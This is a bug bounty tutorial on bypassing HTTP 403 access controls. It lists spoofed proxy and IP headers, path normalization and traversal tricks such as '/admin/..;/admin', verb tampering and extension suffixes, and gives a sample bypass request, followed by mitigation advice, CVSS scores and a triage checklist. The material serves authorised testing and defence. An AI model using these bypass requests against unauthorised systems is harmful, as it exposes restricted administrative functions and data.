# 📁 HTTP 403 Forbidden Bypasses — Access Control Testing Guide

*Contributed by Cyber_Spy.404 | Educational Bug Bounty Series*

> **Scope and ethics:** Testing access control bypasses on restricted endpoints (`/admin`, `/api/internal`, `/management`) must remain strictly within written program scope. **Do not use bypass techniques to perform unauthorized administrative actions, access customer databases, or modify production configurations.** Use bypass checks to verify access control policy enforcement and report confirmed exposures responsibly.

---

## 📌 Executive Summary

An **HTTP 403 Forbidden Bypass** occurs when an attacker accesses a protected or restricted web route by exploiting discrepancies between how intermediate reverse proxies (e.g., Cloudflare, AWS ALB, Nginx, Apache) and backend application servers (e.g., Spring Boot, Express, Django, PHP-FPM) normalize and parse URL paths, HTTP headers, and request methods.

### 🧩 Why Bypasses Occur
Access restrictions are often configured at the reverse proxy layer using pattern matching rules:
- *Proxy Rule:* "If path begins with `/admin`, require internal corporate IP or VPN."
- *Backend Behavior:* The backend receives `/admin/..;/admin` or `/admin.json`, normalizes the path to `/admin`, and executes the controller without the proxy's IP restriction being triggered!

```
Request: GET /admin/..;/admin HTTP/1.1
                 |
                 v
+------------------------------------+
| Reverse Proxy / WAF                |
| Evaluates rule: "Path == /admin"?  |
| Result: False (Looks like a subpath|
| or doesn't match literal "/admin") |
| Forwarded! ✅                      |
+----------------+-------------------+
                 |
                 v
+------------------------------------+
| Backend Application (Spring / PHP) |
| Normalizes: "/admin/..;/admin"     |
| Resolves path to: "/admin"         |
| Serves protected Admin Portal! ❌  |
+------------------------------------+
```

---

## 🔍 Core Bypass Methodologies & Techniques

### 1. Reverse Proxy Override Headers
Many enterprise reverse proxies and load balancers inspect custom headers to rewrite paths or pass client IP addresses to upstream servers. If the backend trusts these headers from external clients:

#### Path Overrides:
```http
GET / HTTP/1.1
Host: example.com
X-Original-URL: /admin/dashboard
```
```http
GET / HTTP/1.1
Host: example.com
X-Rewrite-URL: /admin/dashboard
```

#### IP Spoofing Headers (Bypassing IP Whitelists):
```http
GET /admin HTTP/1.1
Host: example.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded: for=127.0.0.1;by=127.0.0.1
```

---

### 2. Path Normalization & Traversal Tricks
Different web servers (Apache, Nginx, IIS) and application frameworks normalize directory traversal sequences differently:

| Technique | Example Syntax | Targeted Behavior |
| :--- | :--- | :--- |
| **Dot Traversal Suffix** | `/admin/.` or `/admin/./` | Trailing dot resolved by backend, ignored by proxy |
| **Semicolon Path Truncation** | `/admin;` or `/admin/..;/admin` | Spring Boot treats `;` as matrix parameter; proxy treats as subpath |
| **Double Slash** | `//admin//` or `///admin///` | Normalizes duplicate slashes to `/admin` |
| **Trailing Slash Swapping** | `/admin` vs `/admin/` | Routing rule applied to exact string `/admin` only |
| **URL-Encoded Traversal** | `/%2e/admin` or `/%2e%2e/admin` | Double/single encoding decoded only by backend |
| **Whitespace / Null Suffix** | `/admin%20` or `/admin%09` or `/admin%00` | Trims whitespace or null bytes |
| **Question Mark Truncation** | `/admin?` or `/admin?anything` | Proxy checks path; backend treats as root |

---

### 3. Case Sensitivity & Character Encodings
In environments where proxies are case-sensitive but backend routes or operating systems are case-insensitive (e.g., Windows IIS, macOS):
- `/Admin`, `/ADMIN`, `/aDmiN`, `/adMiN`
- URL encoding letters: `/%61dmin` (`%61` = 'a')
- Unicode normalization: `/ådmin` (if normalized to 'a')

---

### 4. HTTP Method & Verb Tampering
Web server security constraints (such as Apache `<Limit GET>`) often protect specific HTTP verbs while leaving others open:
- Change `GET` to: `POST` (with empty body or `{}`), `HEAD`, `OPTIONS`, `PUT`, `TRACE`, `CONNECT`.
- Test method override headers:
  ```http
  POST /admin HTTP/1.1
  X-HTTP-Method-Override: GET
  ```

---

### 5. Content-Type and Extension Suffixes
Frameworks often route requests according to file extensions or accept headers:
- `/admin.json`
- `/admin.html`
- `/admin.php`
- `/admin.xml`
- `/admin;id=1` (Java matrix parameters)

---

## 🛠️ Safe Educational Verification Workflow

### Step 1: Baseline Request (Restricted)
```http
GET /admin/users HTTP/1.1
Host: example.com
```
*Response:* `HTTP/1.1 403 Forbidden`

### Step 2: Injected Bypass Request
```http
GET /admin/..;/admin/users HTTP/1.1
Host: example.com
X-Forwarded-For: 127.0.0.1
```

### Step 3: Vulnerable Observation
*Response:* `HTTP/1.1 200 OK` (Returning admin dashboard HTML or JSON user management list).

---

## 🛡️ Mitigation & Remediation Guidelines

### 1. Enforce Authorization Inside Application Code (Never Rely Solely on Proxy Rules)
Path-based rules at the proxy layer are fragile. Always enforce access control inside the application controllers:
```python
# Django Controller Enforcement (SECURE)
@login_required
@user_passes_test(lambda u: u.is_staff)
def admin_dashboard(request):
    return render(request, 'admin_dashboard.html')
```

### 2. Synchronize Path Normalization Between Proxy and Backend
- Ensure your reverse proxy (Nginx) normalizes URL paths before evaluating routing rules and passing requests upstream:
```nginx
# Nginx Configuration
location /admin/ {
    # Deny non-whitelisted IPs
    allow 192.168.1.0/24;
    deny all;
    
    # Strip dangerous proxy headers sent by client
    proxy_set_header X-Original-URL "";
    proxy_set_header X-Rewrite-URL "";
    
    proxy_pass http://backend_upstream;
}
```

### 3. Do Not Trust Client-Supplied IP Headers
Configure load balancers and reverse proxies to overwrite `X-Forwarded-For` with the actual TCP socket connection IP, rather than appending to or accepting client values.

---

## 📊 CVSS 3.1 Severity Reference

- **403 Bypass to Administrative Portal (Full Admin Access):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (Score: **9.8 - Critical**)
- **403 Bypass to Sensitive Read-Only Endpoint (Internal Metrics):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (Score: **7.5 - High**)
- **403 Bypass to Static Assets or Non-Sensitive Pages:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (Score: **5.3 - Medium**)

---

## ✅ Bug Bounty Triage Checklist

- [ ] Target restricted endpoint is within written scope.
- [ ] Confirmed baseline response is `403 Forbidden` or `401 Unauthorized`.
- [ ] Tested proxy override headers (`X-Original-URL`, `X-Forwarded-For`).
- [ ] Tested path normalization (`..;/`, trailing dots, double slashes).
- [ ] Confirmed that bypass exposes actual restricted data or functionality (not a custom 200 error page).
- [ ] Redacted any sensitive internal architecture details from report.
